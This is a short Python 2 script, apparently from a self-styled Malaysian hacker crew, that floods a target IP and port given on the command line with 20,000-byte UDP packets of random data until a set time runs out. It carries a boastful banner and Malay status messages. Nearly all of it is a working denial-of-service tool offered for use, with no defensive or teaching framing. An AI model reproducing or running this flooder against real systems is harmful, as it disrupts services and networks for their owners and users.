import time
import socket
import random
import sys
def usage():
    print "\033[1;32m#########################################################"
    print "#------------------------[\033[1;91mVARIANS 19 CREW\033[1;32m]---------------------"
    print "#-----------------------------------------------------------"
    print "#\033[1;91mMenjalankan: ""python2 80juta.py ""<ip> <port> <packet> \033[1;32m "
    print "#\033[1;91m__     __       _     ___       __    ____    ___  _         _ "
    print "#\033[1;91m\ \   / /      / |   / _ \    / _|  |  _ \  | __| \ \      / / "
    print "#\033[1;91m \ \ / /_____  | |  | (_) |  | |    | |_) | | __|  \ \ /\ / / "
    print "#\033[1;91M  \ V /|_____| | |  \__,  |  | |_   |  _<   | |_    \ V  V /  "
    print "#\033[1;91m   \_/         |_|     /_/    \__|  |_| \_\ |___|    \_/\_/   "
    print "#               \033[1;91m<--[LEADER:KUACIBASI]-->           \033[1;32m"
    print "\033[1;32m#########################################################"
    print "                     CREATOR:MR.ASHFLYY"
    print "                     #WE ARE MALAYSIAN HACKER"
    print "                     #WE ARE MUSLIM HACKER"
def flood(victim, vport, duration):
    # muslim hacker 
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(20000)
    timeout =  time.time() + duration
    sent = 3000
    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (victim, vport))
        sent = sent + 1
        print "\033[1;91mMula \033[1;32m%s \033[1;91mMenghantar Setan \033[1;32m%s \033[1;91mMelalui Port \033[1;32m%s "%(sent, victim, vport)
def main():
    print len(sys.argv)
    if len(sys.argv) != 4:
        usage()
    else:
        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
if __name__ == '__main__':
    main()